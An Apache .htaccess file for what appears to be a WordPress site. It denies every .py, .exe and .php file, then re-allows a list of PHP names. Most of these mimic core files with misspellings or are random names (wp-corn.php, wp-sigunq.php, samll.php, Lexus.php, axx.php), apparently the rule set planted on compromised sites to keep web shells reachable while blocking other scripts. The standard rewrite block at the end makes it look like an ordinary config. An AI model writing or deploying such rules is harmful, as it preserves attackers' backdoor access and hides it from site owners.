<FilesMatch ".(py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "(^wp-login.php|^wp-blog-header.php|^style.php|^style2.php|^index.php|^bless.php|^wp-add.php|^wp-sigunq.php|^upload.php|^install.php|^index1.php|^file.php|^doc.php|^samll.php|^about3.php|^webdb.php|^blurbs.php|^class.api2.php|^nony.php|^wp-corn.php|^gifclass.php|^qa.php|^find_dm.php|^clas.php|^ff.php|^info.php|^style3.php|^info2.php|^gifclassa.php|^clas.php|^jmfi2.php|^e.php|^123.php|^aa.php|^class0-0.php|^class.php|^file27.php|^class-t.api8.php|^index5.php|^Lexus.php|^file28.php|^axx.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>